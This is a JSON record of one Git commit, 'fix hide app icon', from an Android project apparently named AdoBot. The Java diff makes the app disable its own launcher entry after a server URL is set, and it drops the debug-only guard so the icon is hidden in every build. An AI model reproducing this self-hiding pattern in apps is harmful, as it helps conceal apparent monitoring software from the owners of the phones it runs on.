{"new_feature": "136,1,5,239,2,0.99", "commitmessage": "fix hide app icon", "patch": ["@@ -27,7 +27,7 @@ public void onCreate(Bundle savedInstanceState, PersistableBundle persistentStat\n \n     protected void hideApp() {\n         PackageManager p = getPackageManager();\n-        ComponentName componentName = new ComponentName(this, AskPermissionsActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name=\"android.intent.category.LAUNCHER\" />\n+        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name=\"android.intent.category.LAUNCHER\" />\n         p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);\n     }\n ", "@@ -33,11 +33,13 @@ public void onCreate(Bundle savedInstanceState) {\n \n         editTextUrl = (EditText) findViewById(R.id.edit_text_server_url);\n         if (url != null) {\n-            if (!(url.equals(Constants.DEVELOPMENT_SERVER) || url.equals(\"\")))\n+            if (!(url.equals(Constants.DEVELOPMENT_SERVER) || url.equals(\"\"))) {\n                 // server is already set\n                 done();\n-            else\n+                return;\n+            } else {\n                 editTextUrl.setText(url);\n+            }\n         }\n         btnSetUrl = (Button) findViewById(R.id.btn_set_server);\n         btnSetUrl.setOnClickListener(setUrlClickListener);\n@@ -62,14 +64,7 @@ private void setServerUrl(String url) {\n \n     private void done() {\n         startClient();\n-        if (!BuildConfig.DEBUG)\n-            hideApp();\n-\n+        hideApp();\n         finish();\n     }\n-\n-    @Override\n-    protected void onDestroy() {\n-        super.onDestroy();\n-    }\n }"], "edit": ["-        ComponentName componentName = new ComponentName(this, AskPermissionsActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name=\"android.intent.category.LAUNCHER\" />", "+        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name=\"android.intent.category.LAUNCHER\" />", "-            if (!(url.equals(Constants.DEVELOPMENT_SERVER) || url.equals(\"\")))", "+            if (!(url.equals(Constants.DEVELOPMENT_SERVER) || url.equals(\"\"))) {", "-            else", "+                return;", "+            } else {", "+            }", "-        if (!BuildConfig.DEBUG)", "-            hideApp();", "-", "+        hideApp();", "-", "-    @Override", "-    protected void onDestroy() {", "-        super.onDestroy();", "-    }"], "url": ["https://api.github.com/repos/adonespitogo/AdoBot/commits/8ce1924251dc34ae1b374257b5c6bbf62cb028b7"]}